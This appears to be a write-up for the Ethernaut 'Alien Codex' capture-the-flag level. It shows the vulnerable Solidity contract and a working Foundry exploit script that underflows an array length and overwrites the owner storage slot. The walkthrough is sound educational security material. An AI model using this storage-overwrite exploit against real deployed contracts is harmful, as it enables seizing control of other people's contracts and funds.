# Level 19 - Alien Codex ⏺⏺⏺⏺

{% embed url="https://ethernaut.openzeppelin.com/level/19" %}

### Level Setup

{% hint style="info" %}
You've uncovered an Alien contract. Claim ownership to complete the level.

&#x20; Things that might help

* Understanding how array storage works
* Understanding [ABI specifications](https://solidity.readthedocs.io/en/v0.4.21/abi-spec.html)
* Using a very `underhanded` approach
{% endhint %}

### Level Contract

{% embed url="https://github.com/OpenZeppelin/ethernaut/blob/a89c8f7832258655c09fde16e6602c78e5e99dbd/contracts/src/levels/AlienCodex.sol" %}

{% code lineNumbers="true" fullWidth="true" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
```
{% endcode %}

### Exploit

{% tabs %}
{% tab title="Anvil" %}
```bash
make anvil-exploit-level-19

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}

{% tab title="Holesky" %}
```bash
make holesky-exploit-level-19

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Exploit Deployment Script" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/6ed9d0b08c073bae1d67ccf3724e4822b5704713/script/Level19.s.sol" %}

{% code title="script/Level19.s.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

// ================================================================
// │                       LEVEL 19 - ALIEN CODEX                 │
// ================================================================
interface IAlienCodex {
    function makeContact() external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();

        IAlienCodex alienCodex = IAlienCodex(targetContractAddress);

        vm.startBroadcast();

        // Make contact with the alien codex
        alienCodex.makeContact();

        // Retract the codex length by 1, causing an underflow
        alienCodex.retract();

        // Calculate the index in the array where the owner is stored
        uint256 arraySlot = uint256(keccak256(abi.encodePacked(uint256(1))));
        uint256 ownerSlot = 0;
        uint256 indexToModify = type(uint256).max - arraySlot + ownerSlot + 1;

        // Overwrite the owner with msg.sender
        alienCodex.revise(indexToModify, bytes32(uint256(uint160(msg.sender))));
        vm.stopBroadcast();
    }
}
```
{% endcode %}
{% endtab %}
{% endtabs %}

Submit instance... 🥳

### Completion Message

{% hint style="info" %}
This level exploits the fact that the EVM doesn't validate an array's ABI-encoded length vs its actual payload.

Additionally, it exploits the arithmetic underflow of array length, by expanding the array's bounds to the entire storage area of `2^256`. The user is then able to modify all contract storage.

Both vulnerabilities are inspired by 2017's [Underhanded coding contest](https://medium.com/@weka/announcing-the-winners-of-the-first-underhanded-solidity-coding-contest-282563a87079)
{% endhint %}
